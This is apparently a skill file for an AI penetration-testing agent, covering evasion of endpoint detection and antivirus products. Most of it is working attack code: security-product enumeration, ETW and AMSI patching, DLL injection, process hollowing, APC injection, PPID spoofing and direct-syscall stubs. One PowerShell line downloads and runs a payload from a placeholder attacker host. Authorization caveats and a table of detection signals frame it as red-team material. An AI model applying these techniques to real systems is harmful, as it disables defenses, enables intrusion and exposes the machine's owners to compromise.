---
name: edr-evasion
description: "EDR/AV evasion techniques including hook unhooking, direct syscalls, ETW/AMSI patching, process injection, and memory encryption"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["edr evasion", "edr bypass", "av bypass", "hook unhooking", "direct syscalls", "amsi bypass", "etw patching", "process injection", "memory encryption", "endpoint detection", "syscall evasion", "unhooking", "ppid spoofing"]
mitreAttack: ["T1562.001", "T1055", "T1027", "T1014", "T1056"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# EDR / AV Evasion

## When to Use

- You have code execution on a target and need to evade endpoint security products
- You are testing EDR detection coverage during a red team engagement
- You need to understand how security products detect and block offensive techniques
- Assessing whether a target's EDR can detect specific attack patterns
- Researching evasion technique effectiveness against modern defenders

## Do Not Use

- Against production systems without explicit written authorization and agreed rules of engagement
- To develop malware or offensive tools for unauthorized access
- On systems where EDR evasion could cause data loss or service disruption
- Against security products in shared environments without provider consent

## Auth Context

EDR evasion techniques are typically applied post-exploitation. Before making HTTP requests, call **getCapturedHeaders** with the target URL to get real auth context. Pass these in the `headers` parameter of httpRequest for any web-based C2 or exfiltration channels.

---

## Detection — Identify EDR/AV Presence

### Process Enumeration

```powershell
# List security-related processes
Get-Process | Where-Object {$_.ProcessName -match 'MsSense|SenseIR|SenseNdr|Cylance|CrowdStrike|CSFalconService|cb|SentinelAgent|Traps|cyserver|bdagent|savservice'} | Select-Object ProcessName, Id, Path

# Check for EDR services
Get-Service | Where-Object {$_.DisplayName -match 'CrowdStrike|Carbon Black|Cylance|Sentinel|Defender|Sophos|Trend|Symantec|McAfee|Kaspersky'} | Select-Object DisplayName, Status

# WMI query for security products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, productState, pathToSignedProductExe
```

### Driver Enumeration

```powershell
# List loaded kernel drivers
driverquery /v | Select-String -Pattern 'edr|crowd|carbon|cylance|sentinel|traps|sophos|defender'

# Minifilter drivers (filesystem monitoring)
fltmc instances
```

### Hook Detection

```powershell
# Check ntdll.dll for hooks (first byte 0xE9 = JMP = hooked)
$rsp = [System.Runtime.InteropServices.Marshal]::ReadByte((Get-Module ntdll).BaseAddress + 0x1000)
if ($rsp -eq 0xE9) { Write-Host "ntdll appears hooked" }
```

---

## Evasion Technique 1: Unhooking

Overwrite hooked functions in memory with clean bytes from disk.

```c
// Find ntdll.dll base address
HMODULE ntdll = GetModuleHandle("ntdll.dll");
LPVOID funcAddr = GetProcAddress(ntdll, "NtAllocateVirtualMemory");

// Read original bytes from clean ntdll on disk
HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// Map clean copy, copy original prologue bytes over hooked version
// WriteProcessMemory to restore first 5+ bytes
```

**Detection caveat:** Modern EDRs use kernel callbacks, ETW, and minifilter drivers — user-mode unhooking alone is insufficient.

---

## Evasion Technique 2: Direct / Indirect Syscalls

Bypass user-mode hooks by calling syscalls directly.

### Direct Syscalls (SysWhispers Pattern)

```asm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h        ; SSN for NtAllocateVirtualMemory
    syscall
    ret
NtAllocateVirtualMemory ENDP
```

### Indirect Syscalls (Preferred)

```asm
; Find syscall instruction inside ntdll.dll, jump to it
; Preserves plausible call stack origin
NtAllocateVirtualMemory_Indirect PROC
    mov r10, rcx
    mov eax, 18h
    lea r11, [syscall_instruction_in_ntdll]
    jmp r11
NtAllocateVirtualMemory_Indirect ENDP
```

### Dynamic SSN Resolution

```c
// Parse ntdll from memory, find syscall stubs, extract SSNs
// Works across Windows versions without hardcoded values
```

**Tools:** SysWhispers2, SysWhispers3, FreshyCalls, HellsGate, Halo's Gate

---

## Evasion Technique 3: ETW Patching

Disable Event Tracing for Windows to reduce telemetry.

```c
// Byte patch — patch EtwEventWrite to return immediately
HMODULE ntdll = GetModuleHandle("ntdll.dll");
LPVOID etwWrite = GetProcAddress(ntdll, "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(etwWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(char*)etwWrite = 0xC3;  // RET
VirtualProtect(etwWrite, 1, oldProtect, &oldProtect);
```

**Detection caveat:** Defender engine 1.417+ re-hooks common byte patches within ~50ms. Prefer callback filtering.

---

## Evasion Technique 4: AMSI Bypass

### Classic Patch

```c
HMODULE amsi = LoadLibrary("amsi.dll");
LPVOID amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
DWORD oldProtect;
VirtualProtect(amsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(char*)amsiScanBuffer = 0xC3;  // RET
VirtualProtect(amsiScanBuffer, 1, oldProtect, &oldProtect);
```

### Patchless VEH Bypass

```c
// Register vectored exception handler
// Set hardware breakpoint on AmsiScanBuffer
// In handler, redirect execution to benign stub
// No byte modification = avoids signature detection
AddVectoredExceptionHandler(1, &AmsiVehHandler);
```

### PowerShell Runspace (No Patching)

```powershell
$iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace($iss)
$rs.Open()
$ps = [System.Management.Automation.PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')").Invoke()
```

---

## Evasion Technique 5: Process Injection

### Classic DLL Injection

```c
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID remoteMem = VirtualAllocEx(hProc, NULL, dllPathLen, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, remoteMem, dllPath, dllPathLen, NULL);
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), remoteMem, 0, NULL);
```

### Process Hollowing

```c
// 1. Create target process in suspended state
// 2. Unmap (hollow) its image from memory
// 3. Write attacker's PE image into the hollowed space
// 4. Update entry point, resume thread
STARTUPINFO si = {sizeof(si)};
PROCESS_INFORMATION pi;
CreateProcess(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
// NtUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread
```

### APC Injection

```c
// Queue APC to alertable thread
QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0);
```

---

## Evasion Technique 6: PPID Spoofing

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
// InitializeProcThreadAttributeList for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
// Set hParentProcess to explorer.exe handle
CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi);
```

---

## Evasion Technique 7: Memory Encryption

### Ekko Sleep Obfuscation

```c
// Uses NtContinue + APC to schedule decryption
// Sets up CONTEXT with RIP pointing to VirtualProtect
// Decrypts shellcode only during execution, re-encrypts on sleep
// Evades memory scanning during sleep periods
```

---

## Cheat Sheet — Quick Reference

| Technique | Tool/Binary | Detection Signal |
|-----------|-------------|-----------------|
| Unhook ntdll | Manual / unhook-bof | ReadProcessMemory on ntdll, permission flips |
| Direct syscalls | SysWhispers2/3 | Non-ntdll syscall sites, unusual call stacks |
| Indirect syscalls | HellsGate/Halo's Gate | syscall instruction jumps from unusual locations |
| ETW patch | Manual / SharpBlock | EtwEventWrite returning immediately |
| AMSI patch | Manual / SharpBlock | AmsiScanBuffer returning immediately |
| Process hollowing | Manual | NtUnmapViewOfSection, RWX regions |
| DLL injection | Manual | CreateRemoteThread + LoadLibrary |
| PPID spoofing | Manual | PROC_THREAD_ATTRIBUTE_PARENT_PROCESS |
| Memory encryption | Ekko/Foliage | NtContinue + APC patterns |

---

## Anti-Hallucination

- EDR evasion is an advanced post-exploitation topic — only apply when you have confirmed shell access and the engagement scope includes evasion testing
- Never claim EDR has been bypassed without evidence (process execution, file creation, C2 callback)
- Kernel-level monitoring (ETW, callbacks) is NOT bypassed by user-mode unhooking alone
- Modern EDRs have multiple detection layers — a single technique rarely achieves full evasion
- Document exactly which technique you attempted and what detection signals were observed
